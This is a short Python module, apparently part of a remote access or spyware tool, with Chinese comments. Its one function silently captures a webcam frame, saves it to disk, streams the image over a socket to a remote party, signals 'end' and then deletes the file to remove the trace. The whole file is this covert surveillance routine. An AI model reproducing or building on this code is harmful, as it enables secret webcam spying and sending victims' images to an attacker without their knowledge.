import time
import os
import cv2


def camera(socket):
    try:
        output_dir = "D:\\"
        cap = cv2.VideoCapture(0)
        f, frame = cap.read()
        cv2.imwrite(output_dir + "temp.png", frame)
        cap.release()
    except cv2.error:
        socket.send(b"no camera found!")
        return None
    # 文件传输
    with open(output_dir + "temp.png", "rb") as screenshotFile:
        base64_data = screenshotFile.read()
    socket.sendall(base64_data)
    # 释放对象
    time.sleep(0.1)
    socket.send("end".encode())
    # 传输图片后删除
    if os.path.exists(output_dir+"temp.png"):
        os.remove(output_dir+"temp.png")
